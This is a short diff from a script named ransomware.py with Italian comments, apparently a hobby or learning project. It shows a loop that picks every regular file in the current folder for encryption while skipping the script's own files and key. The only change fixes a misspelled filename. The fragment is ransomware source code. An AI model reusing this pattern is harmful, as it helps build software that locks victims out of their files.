@@ -14,7 +14,7 @@ files = []
 # for che prende ogni tipo di elemento all'interno della cartella dove è stato eseguito il codice
 for file in os.listdir():
     # skippa se stesso per evitare di essere anche criptato anche lui
-    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "recive.py":
+    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "recieve.py":
         continue
     # per ogni file (e quindi non cartella/directory) esegui la cifratura
     if os.path.isfile(file):
